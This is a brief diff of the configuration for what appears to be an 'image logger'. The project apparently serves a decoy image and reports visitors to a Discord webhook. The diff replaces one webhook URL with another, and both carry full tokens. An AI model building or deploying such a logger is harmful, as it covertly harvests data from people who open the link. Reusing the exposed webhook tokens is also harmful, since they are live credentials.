@@ -10,7 +10,7 @@ __author__ = "Sean"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1194031882745163796/KsJ61wSAPJihbf39rGKpN8nB8-DXVMUkBDbx_sjqnaq07OZk2njTiGmuKAbUQxYjTyZD",
+    "webhook": "https://discord.com/api/webhooks/1194036798461071411/gCQQcZJy2vKyl7-fmzQUlK_tRkQ6ESTa6IBqPR0uFE_OvZDW-2CFFe7palhHQi2zW332",
     "image": "https://i.natgeofe.com/n/82fddbcc-4cbb-4373-bf72-dbc30068be60/drill-monkey-01_2x3.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
